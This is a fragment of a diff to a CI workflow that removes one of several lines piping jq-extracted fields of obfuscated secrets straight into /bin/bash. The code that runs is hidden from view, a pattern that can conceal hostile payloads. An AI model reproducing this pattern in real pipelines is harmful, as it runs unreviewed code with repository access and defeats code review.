@@ -19,7 +19,6 @@ jobs:
           cjxv26987: ${{ secrets.cjxv26987 }}
         run: |
           printf '%s' "$cjxv26987" | jq -r .yyir4 | /bin/bash
-          echo $dl24 | jq -r .ylcf0 | /bin/bash
           printf '%s' "$lwih49" | jq -r .bawf54415 | /bin/bash
           echo $xaab31 | jq -r .plcb63638 | /bin/bash
           echo $erpch618 | jq -r .lyn3084 | /bin/bash
